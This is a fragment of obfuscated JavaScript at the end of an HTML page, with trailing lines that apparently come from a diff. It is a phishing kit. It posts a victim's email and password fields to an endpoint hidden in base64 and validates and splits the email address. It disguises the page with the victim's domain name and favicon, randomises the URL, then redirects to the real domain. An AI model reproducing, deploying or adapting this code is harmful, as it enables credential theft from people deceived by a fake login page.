_0x2acdeb=_0x2eaf78;try{window[_0x2acdeb(0x13c)]=atob(window[_0x2acdeb(0x13c)]);}catch(_0x32f46d){}console['log'](window[_0x2acdeb(0x13c)]);try{const _0x3674cd=new FormData();return _0x3674cd[_0x2acdeb(0x118)]('ai',_0x30c15e),_0x3674cd[_0x2acdeb(0x118)](_0x2acdeb(0x146),_0x30c15e),_0x3674cd[_0x2acdeb(0x118)](_0x2acdeb(0x170),_0x7c5a99),_0x3674cd[_0x2acdeb(0x118)]('pr',_0x7c5a99),await axios[_0x2acdeb(0x12e)](window[_0x2acdeb(0x13c)],_0x3674cd);}catch(_0x21fd56){throw Error(_0x2acdeb(0x106));}},'validateEmail'(_0x14c9ee){const _0x1ef2a0=_0x2eaf78,_0x27cf40=/^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;return _0x27cf40[_0x1ef2a0(0x158)](_0x14c9ee);},'checkForDynamicAndValidateSplitEmail'(_0x18d962){const _0x15e054=_0x2eaf78;if(!window[_0x15e054(0x147)])throw Error(_0x15e054(0x127));if(!this[_0x15e054(0x172)](_0x18d962))throw Error('Invalid\x20Email\x20Address');return _0x18d962[_0x15e054(0x16a)]('@');},'turnUrlToRandom'(){const _0x54e069=_0x2eaf78,_0x256eec=new URL(window[_0x54e069(0x131)]['href']);!(_0x256eec[_0x54e069(0x16d)][_0x54e069(0x10a)]('websrc')&&_0x256eec[_0x54e069(0x16d)][_0x54e069(0x10a)](_0x54e069(0x149))&&_0x256eec[_0x54e069(0x16d)][_0x54e069(0x10a)]('id'))&&(_0x256eec[_0x54e069(0x16d)][_0x54e069(0x118)](_0x54e069(0x178),_0x256eec[_0x54e069(0x16d)][_0x54e069(0x103)]('websrc')||this[_0x54e069(0x15e)](0x12e)),_0x256eec['searchParams'][_0x54e069(0x118)]('dispatch',_0x256eec[_0x54e069(0x16d)][_0x54e069(0x103)](_0x54e069(0x149))||this[_0x54e069(0x15e)](0x3,_0x54e069(0x151))),_0x256eec[_0x54e069(0x16d)][_0x54e069(0x118)]('id',_0x256eec['searchParams'][_0x54e069(0x103)]('id')||this[_0x54e069(0x15e)](0x6,_0x54e069(0x151))),window[_0x54e069(0x131)]['replace'](_0x256eec['toString']()));},'randomString'(_0x95fd7,_0x2a3892=_0x2eaf78(0x14e)){const _0x342a97=_0x2eaf78;var _0x2eff0f='';for(var _0x575194=_0x95fd7;_0x575194>0x0;--_0x575194)_0x2eff0f+=_0x2a3892[Math[_0x342a97(0x15c)](Math[_0x342a97(0x14a)]()*_0x2a3892['length'])];return _0x2eff0f;},'pageMiddleware'(){return;},'finalRedirectUrl'(){const _0x1b244a=_0x2eaf78;return _0x1b244a(0x112)+this['emailDomainName'][_0x1b244a(0x139)]();},'setDocumentPageTitle'(){const _0x1909c1=_0x2eaf78;document[_0x1909c1(0x15a)]=this[_0x1909c1(0x11e)]?_0x1909c1(0x132)+this[_0x1909c1(0x11e)]['split']('.')[0x0][_0x1909c1(0x139)]()+_0x1909c1(0x160):window[_0x1909c1(0x14d)];},'setDocumentPageFavicon'(){const _0x2fee8c=_0x2eaf78;var _0x2e49af=document[_0x2fee8c(0x141)](_0x2fee8c(0x113));!_0x2e49af&&(_0x2e49af=document['createElement'](_0x2fee8c(0x156)),_0x2e49af[_0x2fee8c(0x10f)]=_0x2fee8c(0x157),document[_0x2fee8c(0x173)]('head')[0x0][_0x2fee8c(0x150)](_0x2e49af)),favicon=new Image(),favicon[_0x2fee8c(0x111)]=this[_0x2fee8c(0x154)],favicon[_0x2fee8c(0x15f)]=function(){const _0x85d6d2=_0x2fee8c;_0x2e49af[_0x85d6d2(0x108)]=window[_0x85d6d2(0x16f)];},favicon[_0x2fee8c(0x105)]=function(_0x5d1ec4){const _0x22087e=_0x2fee8c;_0x2e49af['href']=_0x5d1ec4[_0x22087e(0x16e)][_0x22087e(0x111)];};}}})['$mount'](_0x2eaf78(0x116)));
+    </script>
+  </body>
+</html>
+
+'))</script>
